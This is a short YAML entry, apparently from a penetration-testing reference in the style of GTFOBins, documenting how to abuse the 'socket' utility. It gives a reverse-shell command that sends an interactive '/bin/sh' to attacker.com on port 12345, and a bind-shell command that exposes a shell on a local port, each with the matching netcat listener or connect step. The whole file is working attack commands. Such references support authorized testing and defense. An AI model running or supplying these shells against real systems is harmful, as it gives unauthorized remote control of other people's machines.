---
functions:
  reverse-shell:
    - description: Run `nc -l -p 12345` on the attacker box to receive the shell.
      code: |
        RHOST=attacker.com
        RPORT=12345
        socket -qvp '/bin/sh -i' $RHOST $RPORT
  bind-shell:
    - description: Run `nc target.com 12345` on the attacker box to connect to the shell.
      code: |
        LPORT=12345
        socket -svp '/bin/sh -i' $LPORT
---
